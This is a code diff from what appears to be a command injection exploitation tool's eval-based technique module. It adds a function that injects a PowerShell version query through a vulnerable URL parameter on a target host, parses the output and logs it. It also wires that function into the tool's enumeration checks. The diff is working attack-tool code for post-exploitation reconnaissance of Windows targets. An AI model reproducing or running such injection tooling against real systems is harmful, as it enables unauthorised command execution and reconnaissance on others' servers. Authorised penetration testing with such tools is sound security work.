@@ -28,6 +28,35 @@ The "eval-based" code injection technique on classic OS command injection.
 """
 
 """
+Powershell's version number enumeration (for Windows OS)
+"""
+def powershell_version(separator, TAG, prefix, suffix, http_request_method, url, vuln_parameter, alter_shell, filename): 
+  cmd = settings.PS_VERSION
+  if alter_shell:
+    cmd = cmd.replace("'","\\'")
+  else:
+    cmd = "\"" + cmd + "\""
+  #Command execution results.
+  response = eb_injector.injection(separator, TAG, cmd, prefix, suffix, http_request_method, url, vuln_parameter, alter_shell, filename)
+  # Evaluate injection results.
+  ps_version = eb_injector.injection_results(response, TAG)
+  try:
+    ps_version = "".join(str(p) for p in ps_version).replace(" ", "", 1)[:-1]
+    if float(ps_version):
+      if menu.options.verbose:
+        print ""
+      # Output PowerShell's version number
+      sys.stdout.write(Style.BRIGHT + "(!) The PowerShell's version number is " + Style.UNDERLINE +  ps_version + Style.RESET_ALL + Style.BRIGHT + Style.RESET_ALL + ".\n")
+      sys.stdout.flush()
+      # Add infos to logs file. 
+      output_file = open(filename, "a")
+      output_file.write("    (!) The PowerShell's version number is " + ps_version + ".\n")
+      output_file.close()
+  except ValueError:
+    print Fore.YELLOW + "(^) Warning: Heuristics have failed to identify PowerShell's version, which means that many attack vector may be failed." + Style.RESET_ALL 
+
+
+"""
 Hostname enumeration
 """
 def hostname(separator, TAG, prefix, suffix, http_request_method, url, vuln_parameter, alter_shell, filename):
@@ -40,8 +69,8 @@ def hostname(separator, TAG, prefix, suffix, http_request_method, url, vuln_para
     if menu.options.verbose:
       print ""
     shell = "".join(str(p) for p in shell).replace(" ", "", 1)[:-1]
-    if not menu.options.verbose:
-      print ""
+    # if not menu.options.verbose:
+    #   print ""
     sys.stdout.write(Style.BRIGHT + "(!) The hostname is " + Style.UNDERLINE + shell + Style.RESET_ALL + ".\n")
     sys.stdout.flush()
     # Add infos to logs file. 
@@ -365,14 +394,20 @@ def single_os_cmd_exec(separator, TAG, prefix, suffix, http_request_method, url,
 Check the defined options
 """
 def do_check(separator, TAG, prefix, suffix, http_request_method, url, vuln_parameter, alter_shell, filename):
+  if not menu.options.verbose:
+    print ""
+
+  if menu.options.ps_version and settings.TARGET_OS == "win":
+    powershell_version(separator, TAG, prefix, suffix, http_request_method, url, vuln_parameter, alter_shell, filename)
+    settings.ENUMERATION_DONE = True
 
   if menu.options.hostname:
     hostname(separator, TAG, prefix, suffix, http_request_method, url, vuln_parameter, alter_shell, filename)
     settings.ENUMERATION_DONE = True
-  elif settings.ENUMERATION_DONE == False:
-      print ""
-  else:
-      print ""
+  # elif settings.ENUMERATION_DONE == False:
+  #     print ""
+  # else:
+  #     print ""
     
   if menu.options.current_user:
     current_user(separator, TAG, prefix, suffix, http_request_method, url, vuln_parameter, alter_shell, filename)
